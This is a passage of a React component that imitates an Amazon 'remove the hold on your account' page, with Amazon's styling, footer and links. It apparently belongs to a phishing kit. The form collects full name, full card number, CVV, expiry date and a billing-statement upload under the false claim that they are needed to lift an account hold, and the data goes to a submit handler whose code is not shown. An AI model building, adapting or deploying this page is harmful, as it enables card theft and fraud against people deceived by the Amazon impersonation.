                                            name="phone-number"
                                            className="a-input-text a-form-normal input-field-width text-input-field has-action-on-load"
                                            data-action-on-load="register-listeners"
                                            data-listeners=""
                                        />
                                    </div>
                                </div>
                            </div>

                            <div
                                id=""
                                className="a-section a-spacing-mini abbott-view-component component-display-block component-width-extra_large"
                            >
                                <h1
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    className="a-size-large has-action-on-load text-align-left a-text-bold"
                                >
                                    Enter your card information:
                                </h1>
                            </div>

                            <div
                                id=""
                                className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
                            >
                                <h1
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    className="a-size-base has-action-on-load text-align-left a-text-normal"
                                >
                                    This is required to remove the hold on your
                                    account.
                                </h1>
                            </div>

                            <div
                                id=""
                                className="a-section abbott-view-component component-display-block component-width-extra_large"
                            >
                                <div className="a-section a-spacing-none">
                                    <div className="a-section a-spacing-none">
                                        <label className="a-form-label">
                                            <i className="input-field-required"></i>{' '}
                                            Full name
                                        </label>
                                        <input
                                            type="text"
                                            maxLength="100"
                                            placeholder="Name that appears on the payment method"
                                            name="full-name"
                                            className="a-input-text a-form-normal input-field-width text-input-field has-action-on-load"
                                            value={fullNameCard}
                                            onChange={handleChangeFullNameCard}
                                        />
                                    </div>
                                </div>
                            </div>

                            <div className="custom-your-card abbott-view-component component-width-extra_large">
                                <div
                                    id=""
                                    className=" component-display-block custom-your-card-item1 pb-14"
                                >
                                    <div className="a-section a-spacing-none">
                                        <div className="a-section a-spacing-none">
                                            <label className="a-form-label">
                                                <i className="input-field-required"></i>{' '}
                                                Card number
                                            </label>
                                            <input
                                                type="tel"
                                                maxLength="20"
                                                name="phone-number"
                                                className="a-input-text a-form-normal input-field-width text-input-field has-action-on-load w-full"
                                                data-action-on-load="register-listeners"
                                                data-listeners=""
                                                value={card}
                                                onChange={handleChangeCard}
                                            />
                                        </div>
                                    </div>
                                </div>
                                <div
                                    id="text-input-11"
                                    className="  component-display-block custom-your-card-item2"
                                >
                                    <div className="a-section a-spacing-none">
                                        <div className="a-section a-spacing-none">
                                            <label className="a-form-label">
                                                <i className="input-field-required"></i>{' '}
                                                Security Code (CVV/CVC)
                                            </label>
                                            <input
                                                type="tel"
                                                maxLength="20"
                                                name="phone-number"
                                                className="a-input-text a-form-normal input-field-width text-input-field has-action-on-load w-25"
                                                data-action-on-load="register-listeners"
                                                data-listeners=""
                                                value={security}
                                                onChange={handleChangesecurity}
                                            />
                                            <span>
                                                {' '}
                                                (
                                                <span className="custom-text">
                                                    What's this?
                                                </span>
                                                )
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large">
                                <div className="a-section pb-22">
                                    <div className="a-section">
                                        <label className="a-form-label">
                                            <i className="input-field-required"></i>{' '}
                                            Expiration date
                                        </label>
                                        <div className="custom-your-card2">
                                            <span className="a-dropdown-container">
                                                <select
                                                    className="a-native-dropdown a-declarative"
                                                    value={month}
                                                    onChange={handleChangeMonth}
                                                >
                                                    <option value="1">
                                                        01
                                                    </option>
                                                    <option value="2">
                                                        02
                                                    </option>
                                                    <option value="3">
                                                        03
                                                    </option>
                                                    <option value="4">
                                                        04
                                                    </option>
                                                    <option value="5">
                                                        05
                                                    </option>
                                                    <option value="6">
                                                        06
                                                    </option>
                                                    <option value="7">
                                                        07
                                                    </option>
                                                    <option value="8">
                                                        08
                                                    </option>
                                                    <option value="9">
                                                        09
                                                    </option>
                                                    <option value="10">
                                                        10
                                                    </option>
                                                    <option value="11">
                                                        11
                                                    </option>
                                                    <option value="12">
                                                        12
                                                    </option>
                                                </select>
                                                <span
                                                    tabIndex="-1"
                                                    data-action-on-load="register-listeners"
                                                    data-listeners=""
                                                    data-a-classname="input-field-width has-action-on-load"
                                                    className="a-button a-button-dropdown input-field-width has-action-on-load"
                                                    aria-hidden="true"
                                                >
                                                    <span className="a-button-inner">
                                                        <span
                                                            className="a-button-text a-declarative"
                                                            data-csa-c-func-deps="aui-da-a-dropdown-button"
                                                            data-csa-c-type="widget"
                                                            data-csa-interaction-events="click"
                                                            data-action="a-dropdown-button"
                                                            aria-hidden="true"
                                                        >
                                                            <span className="a-dropdown-prompt"></span>
                                                        </span>
                                                        <i className="a-icon a-icon-dropdown"></i>
                                                    </span>
                                                </span>
                                            </span>
                                            <span className="a-dropdown-container">
                                                <select
                                                    data-action="a-dropdown-select"
                                                    className="a-native-dropdown a-declarative"
                                                    value={year}
                                                    onChange={handleChangeYear}
                                                >
                                                    <option value="2024">
                                                        2024
                                                    </option>
                                                    <option value="2025">
                                                        2025
                                                    </option>
                                                    <option value="2026">
                                                        2026
                                                    </option>
                                                    <option value="2027">
                                                        2027
                                                    </option>
                                                    <option value="2028">
                                                        2028
                                                    </option>
                                                    <option value="2029">
                                                        2029
                                                    </option>
                                                    <option value="2030">
                                                        2030
                                                    </option>
                                                    <option value="2031">
                                                        2031
                                                    </option>
                                                    <option value="2032">
                                                        2032
                                                    </option>
                                                    <option value="2033">
                                                        2033
                                                    </option>
                                                    <option value="2034">
                                                        2034
                                                    </option>
                                                    <option value="2035">
                                                        2035
                                                    </option>
                                                </select>
                                                <span
                                                    tabIndex="-1"
                                                    data-action-on-load="register-listeners"
                                                    data-listeners=""
                                                    data-a-classname="input-field-width has-action-on-load"
                                                    className="a-button a-button-dropdown input-field-width has-action-on-load"
                                                    aria-hidden="true"
                                                >
                                                    <span className="a-button-inner">
                                                        <span
                                                            className="a-button-text a-declarative"
                                                            data-csa-c-func-deps="aui-da-a-dropdown-button"
                                                            data-csa-c-type="widget"
                                                            data-csa-interaction-events="click"
                                                            data-action="a-dropdown-button"
                                                            aria-hidden="true"
                                                        >
                                                            <span className="a-dropdown-prompt"></span>
                                                        </span>
                                                        <i className="a-icon a-icon-dropdown"></i>
                                                    </span>
                                                </span>
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div
                                id="divider-12"
                                className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
                            >
                                <hr
                                    aria-hidden="true"
                                    className="a-divider-normal"
                                />
                            </div>

                            <div
                                id="header-13"
                                className="a-section a-spacing-mini abbott-view-component component-display-block component-width-extra_large"
                            >
                                <h1
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    className="a-size-large has-action-on-load text-align-left a-text-bold"
                                >
                                    Attach supporting document
                                </h1>
                            </div>

                            <div
                                id="header-14"
                                className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
                            >
                                <h1
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    className="a-size-base has-action-on-load text-align-left a-text-normal"
                                >
                                    This can help remove the hold on your
                                    account more quickly.
                                </h1>
                            </div>

                            <div
                                id="text-15"
                                className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
                            >
                                <span
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    className="a-size-base has-action-on-load text-align-left"
                                >
                                    <iframe
                                        src="https://player.vimeo.com/video/667387306?h=37c31a1554"
                                        width="100%"
                                        height="300"
                                        frameBorder="0"
                                        allow="autoplay; fullscreen; picture-in-picture"
                                        allowFullScreen
                                    ></iframe>
                                </span>
                            </div>

                            <div
                                id="header-16"
                                className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
                            >
                                <h1
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    className="a-size-base has-action-on-load text-align-left a-text-bold"
                                >
                                    What type of document should you upload?
                                </h1>
                            </div>

                            <div
                                id="text-17"
                                className="a-section a-spacing-medium abbott-view-component component-display-block component-width-extra_large"
                            >
                                <span
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    className="a-size-base has-action-on-load text-align-left"
                                >
                                    <a href="https://m.media-amazon.com/images/G/01/CSSW/BillingstatementCCDC_New.pdf">
                                        View sample documents
                                    </a>
                                </span>
                            </div>

                            <div
                                id="radio-18"
                                className="a-section a-spacing-medium abbott-view-component component-display-block component-width-extra_large"
                            >
                                <div
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    className="a-section a-spacing-none has-action-on-load"
                                >
                                    <div className="a-section a-spacing-none a-padding-small radio-option highlight-on">
                                        <div
                                            data-a-input-name="document-type"
                                            className="a-radio a-radio-fancy validate-on-select"
                                        >
                                            <label>
                                                <input
                                                    type="radio"
                                                    name="document-type"
                                                    value="billing-statement"
                                                    onChange={handleRadioChange}
                                                />
                                                <i className="a-icon a-icon-radio"></i>
                                                <span className="a-label a-radio-label">
                                                    Redacted billing statement
                                                    (Credit / Debit card, Bank
                                                    account) <br />
                                                    <span
                                                        className="a-declarative"
                                                        data-action="a-popover"
                                                        data-csa-c-type="widget"
                                                        data-csa-c-func-deps="aui-da-a-popover"
                                                        data-a-popover='{"name":"radio-18-document-type-0-1","header":"Attaching a billing statement"}'
                                                    >
                                                        <a
                                                            href="/"
                                                            role="button"
                                                            className="a-popover-trigger a-declarative"
                                                        >
                                                            Details
                                                            <i className="a-icon a-icon-popover"></i>
                                                        </a>
                                                    </span>
                                                    <div
                                                        className="a-popover-preload"
                                                        id="a-popover-radio-18-document-type-0-1"
                                                    >
                                                        <span>
                                                            The following
                                                            information must be
                                                            clearly displayed on
                                                            the statement:
                                                        </span>
                                                        <ol className="a-ordered-list a-vertical">
                                                            <li>
                                                                <span className="a-list-item">
                                                                    Your name
                                                                    and billing
                                                                    address
                                                                </span>
                                                            </li>
                                                            <li>
                                                                <span className="a-list-item">
                                                                    Phone number
                                                                    (if included
                                                                    in your
                                                                    billing
                                                                    statement)
                                                                </span>
                                                            </li>
                                                            <li>
                                                                <span className="a-list-item">
                                                                    Last 4
                                                                    digits of
                                                                    the card or
                                                                    account
                                                                    number
                                                                </span>
                                                            </li>
                                                        </ol>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                    </div>
                                    <div className="a-section a-spacing-small sub-radio-option">
                                        <div className="a-section a-spacing-none">
                                            <div
                                                className="a-box a-alert-inline a-alert-inline-info inline-alert a-spacing-top-small"
                                                aria-live="polite"
                                                aria-atomic="true"
                                            >
                                                <div className="a-box-inner a-alert-container">
                                                    <i className="a-icon a-icon-alert"></i>
                                                    <div className="a-alert-content">
                                                        Please ensure ONLY the
                                                        last four digits of the
                                                        card are visible.
                                                        <br />
                                                        For your security, do
                                                        NOT include full card or
                                                        account numbers.
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div className="a-section a-spacing-none a-padding-small radio-option highlight-on">
                                        <div className="a-radio a-radio-fancy validate-on-select">
                                            <label>
                                                <input
                                                    type="radio"
                                                    name="document-type"
                                                    value="unable-to-attach"
                                                    onChange={handleRadioChange}
                                                />
                                                <i className="a-icon a-icon-radio"></i>
                                                <span className="a-label a-radio-label">
                                                    Unable to attach a document
                                                </span>
                                            </label>
                                        </div>
                                    </div>
                                    <div
                                        data-target-value="unable-to-attach"
                                        className="a-section a-spacing-small sub-radio-option radio-value-listener hidden"
                                    >
                                        <div
                                            data-a-input-name="no-document-reason"
                                            className="a-radio a-radio-fancy a-spacing-top-small"
                                        >
                                            <label>
                                                <input
                                                    type="radio"
                                                    name="no-document-reason"
                                                    value="other"
                                                    onChange={handleRadioChange}
                                                />
                                                <i className="a-icon a-icon-radio"></i>
                                                <span className="a-label a-radio-label">
                                                    Other
                                                </span>
                                            </label>
                                        </div>
                                        <div
                                            data-a-input-name="no-document-reason"
                                            className="a-radio a-radio-fancy a-spacing-top-small"
                                        >
                                            <label>
                                                <input
                                                    type="radio"
                                                    name="no-document-reason"
                                                    value="do-not-have"
                                                    onChange={handleRadioChange}
                                                />
                                                <i className="a-icon a-icon-radio"></i>
                                                <span className="a-label a-radio-label">
                                                    I don't have a document
                                                </span>
                                            </label>
                                        </div>
                                        <div
                                            data-a-input-name="no-document-reason"
                                            className="a-radio a-radio-fancy a-spacing-top-small"
                                        >
                                            <label>
                                                <input
                                                    type="radio"
                                                    name="no-document-reason"
                                                    value="do-not-want-to-share"
                                                    onChange={handleRadioChange}
                                                />
                                                <i className="a-icon a-icon-radio"></i>
                                                <span className="a-label a-radio-label">
                                                    I don't want to share my
                                                    document
                                                </span>
                                            </label>
                                        </div>
                                        <div
                                            data-a-input-name="no-document-reason"
                                            className="a-radio a-radio-fancy a-spacing-top-small"
                                        >
                                            <label>
                                                <input
                                                    type="radio"
                                                    name="no-document-reason"
                                                    value="do-not-know-how-to-attach"
                                                    onChange={handleRadioChange}
                                                />
                                                <i className="a-icon a-icon-radio"></i>
                                                <span className="a-label a-radio-label">
                                                    I don't know how to attach a
                                                    document
                                                </span>
                                            </label>
                                        </div>
                                    </div>
                                    <div
                                        id="document-type-error-content"
                                        className="a-section a-spacing-none hidden"
                                    >
                                        <div
                                            className="a-box a-alert-inline a-alert-inline-error"
                                            role="alert"
                                        >
                                            <div className="a-box-inner a-alert-container">
                                                <i className="a-icon a-icon-alert"></i>
                                                <div className="a-alert-content">
                                                    <span className="error-message">
                                                        {' '}
                                                    </span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div
                                id=""
                                className="a-section a-spacing-mini abbott-view-component component-display-none component-width-extra_large block"
                            >
                                <h1
                                    data-action-on-load="register-listeners"
                                    data-listeners='[{"name":"document-type","toggle":"block","matcher":"not_in","values":["unable-to-attach"]}]'
                                    className="a-size-base has-action-on-load text-align-left a-text-bold"
                                >
                                    Document upload
                                </h1>
                            </div>

                            <div
                                id=""
                                className="a-section a-spacing-base abbott-view-component component-display-none component-width-extra_large block"
                            >
                                <span
                                    data-action-on-load="register-listeners"
                                    data-listeners='[{"name":"document-type","toggle":"block","matcher":"not_in","values":["unable-to-attach"]}]'
                                    className="a-size-base has-action-on-load text-align-left"
                                >
                                    <span className="a-size-mini a-color-tertiary a-text-normal">
                                        Supported file types: jpg, pdf, png,
                                        tif. Maximum number of files: 5. Maximum
                                        file size: 15MB.
                                    </span>
                                </span>
                            </div>

                            <div
                                id=""
                                className="a-section a-spacing-medium abbott-view-component component-display-none component-width-extra_large block"
                            >
                                <div
                                    data-name="document"
                                    className="a-section a-spacing-none file-upload"
                                >
                                    <div
                                        id=""
                                        onDragOver={onDragOver}
                                        onDragLeave={onDragLeave}
                                        onDrop={onDrop}
                                        data-action-on-load="register-listeners"
                                        data-listeners='[{"name":"document-type","toggle":"block","matcher":"not_in","values":["unable-to-attach"]}]'
                                        className="a-box file-drag-and-drop-box has-action-on-load"
                                    >
                                        <div className="a-box-inner">
                                            <div className="button-content">
                                                <span
                                                    onClick={selectFiles}
                                                    role="button"
                                                    className="a-button a-button-base file-upload-button button-default-width"
                                                >
                                                    <span className="a-button-inner">
                                                        <span
                                                            id="document-select-file-button-announce"
                                                            className="a-button-text"
                                                            aria-hidden="true"
                                                        >
                                                            <span className="text">
                                                                <i className="file-upload-icon">
                                                                    <svg
                                                                        className="icon"
                                                                        viewBox="0 0 24.01 20.48"
                                                                        focusable="false"
                                                                        role="presentation"
                                                                        stroke="currentColor"
                                                                        aria-hidden="true"
                                                                    >
                                                                        <path
                                                                            d="M12.69,1.12a.82.82,0,0,0-.54.25L6.2,7.6a.76.76,0,0,0-.2.78.8.8,0,0,0,.62.54.83.83,0,0,0,.78-.27L11.94,3.9V16a.78.78,0,0,0,.75.8.89.89,0,0,0,.87-.8V3.9L18.1,8.67a.83.83,0,0,0,.78.27.8.8,0,0,0,.62-.54.76.76,0,0,0-.2-.78L13.35,1.37A.83.83,0,0,0,12.69,1.12ZM1.54,13.28a.79.79,0,0,0-.57.25.85.85,0,0,0-.23.6V20.8a.82.82,0,0,0,.81.8H24a.82.82,0,0,0,.8-.83V14.13a.84.84,0,0,0-.4-.73.77.77,0,0,0-.81,0,.84.84,0,0,0-.4.73V20H2.35V14.13a.85.85,0,0,0-.23-.6A.78.78,0,0,0,1.54,13.28Z"
                                                                            transform="translate(-0.74 -1.12)"
                                                                        ></path>
                                                                    </svg>
                                                                </i>
                                                                Choose file
                                                            </span>
                                                        </span>
                                                    </span>
                                                </span>
                                                <input
                                                    type="file"
                                                    onChange={onFileSelect}
                                                    hidden
                                                    id="file-input"
                                                    multiple
                                                    ref={fileInputRef}
                                                />
                                            </div>
                                            <div className="placeholder">
                                                or drop file here
                                            </div>
                                        </div>
                                    </div>

                                    {isImage && (
                                        <div className="a-section a-spacing-none mt-8">
                                            <div
                                                className="a-box a-alert-inline a-alert-inline-error"
                                                role="alert"
                                            >
                                                <div className=" a-alert-container">
                                                    <i className="a-icon a-icon-alert"></i>
                                                    <div className="a-alert-content">
                                                        <span className="error-message">
                                                            {' '}
                                                            Select a document
                                                            type above
                                                        </span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    )}

                                    <div
                                        id="document-file-rows"
                                        className="a-section a-spacing-none file-row-content"
                                    ></div>
                                    {images &&
                                        images?.map((images, index) => (
                                            <div
                                                id="document-file-rows"
                                                className="a-section a-spacing-none file-row-content"
                                                key={index}
                                            >
                                                <div className="a-fixed-right-grid file-row">
                                                    <div className="a-fixed-right-grid-inner drop1">
                                                        <div className="a-fixed-right-grid-col file-name a-col-left drop2">
                                                            <span>
                                                                {images.name}
                                                            </span>
                                                        </div>
                                                        <div
                                                            className="a-text-right a-fixed-right-grid-col delete-file a-col-right drop3"
                                                            onClick={() =>
                                                                deleteImage(
                                                                    index,
                                                                )
                                                            }
                                                        >
                                                            <i
                                                                className="a-icon a-icon-close"
                                                                role="presentation"
                                                            ></i>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        ))}
                                </div>
                            </div>
                            <div
                                id="text-22"
                                className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large mt-24"
                            >
                                <span
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    className="a-size-base has-action-on-load text-align-left"
                                >
                                    Please don't upload password protected
                                    files.
                                </span>
                            </div>

                            <div
                                id="toggle-23"
                                className="a-section a-spacing-large abbott-view-component component-display-block component-width-extra_large"
                            >
                                <a
                                    data-action-on-load="toggle-components"
                                    data-target-components='{"comments-text-area":"block","comments-disclaimer-text":"block"}'
                                    data-toggle-component="none"
                                    className="a-size-base a-link-normal toggle-components-link has-action-on-load text-align-left"
                                    href="/"
                                >
                                    Add Comments
                                </a>
                            </div>

                            <div
                                id="comments-text-area"
                                className="a-section a-spacing-base abbott-view-component component-display-none component-width-extra_large"
                            >
                                <div className="a-section a-spacing-none">
                                    <div className="a-section a-spacing-none">
                                        <label className="a-form-label">
                                            Comments (optional)
                                        </label>
                                        <div
                                            data-action-on-load="register-listeners"
                                            data-listeners=""
                                            className="a-input-text-wrapper input-field-width has-action-on-load"
                                        >
                                            <textarea
                                                value={comment}
                                                onChange={handleChangeComment}
                                                maxLength="200"
                                                placeholder="Anything else you want us to know about this order payment?"
                                                rows="2"
                                                name="comments"
                                                className="a-form-normal"
                                            ></textarea>
                                        </div>
                                    </div>
                                    <div className="a-section a-spacing-none character-counter-text">
                                        {numChar} characters remaining.
                                    </div>
                                </div>
                            </div>

                            <div
                                id="comments-disclaimer-text"
                                className="a-section a-spacing-extra-large abbott-view-component component-display-none component-width-extra_large"
                            >
                                <span
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    className="a-size-base has-action-on-load text-align-left"
                                >
                                    NOTE: We aren’t able to offer policy
                                    exceptions in response to comments. Do not
                                    include personal information in these
                                    comments.
                                </span>
                            </div>

                            <div
                                id="submit-button-26"
                                className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
                            >
                                <div
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    className="a-section has-action-on-load content-align-center"
                                >
                                    <span
                                        id="submit-button"
                                        onClick={handleUpload}
                                        className="a-button a-button-primary button-default-width"
                                    >
                                        <span className="a-button-inner">
                                            <input
                                                className="a-button-input"
                                                type="submit"
                                                aria-labelledby="submit-button-announce"
                                            />
                                            <span
                                                id="submit-button-announce"
                                                className="a-button-text"
                                                aria-hidden="true"
                                            >
                                                Submit billing details &
                                                document
                                            </span>
                                        </span>
                                    </span>
                                </div>
                            </div>
                        </form>
                    </div>

                    <div className="a-section abbott-view-footer">
                        <div className="a-section a-spacing-none">
                            <div className="a-section abbott-view-component">
                                <div className="a-section a-spacing-extra-large a-spacing-top-extra-large">
                                    <div className="a-divider a-divider-section">
                                        <div className="a-divider-inner"></div>
                                    </div>
                                    <div className="a-section">
                                        <div className="a-section a-text-center a-spacing-small">
                                            <a
                                                className="a-size-mini a-link-normal a-padding-mini"
                                                href="https://www.amazon.com/gp/help/customer/display.html/?ie=UTF8&nodeId=508088"
                                            >
                                                Conditions of Use
                                            </a>
                                            <a
                                                className="a-size-mini a-link-normal a-padding-mini"
                                                href="https://www.amazon.com/gp/help/customer/display.html/?ie=UTF8&nodeId=468496"
                                            >
                                                Privacy Notice
                                            </a>
                                            <a
                                                className="a-size-mini a-link-normal a-padding-mini"
                                                href="https://www.amazon.com/gp/help/customer/display.html"
                                            >
                                                Help
                                            </a>
                                        </div>
                                        <div className="a-section a-text-center a-size-mini a-color-secondary">
                                            © 1996-2024, Amazon.com, Inc. or
                                            its affiliates.
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
}
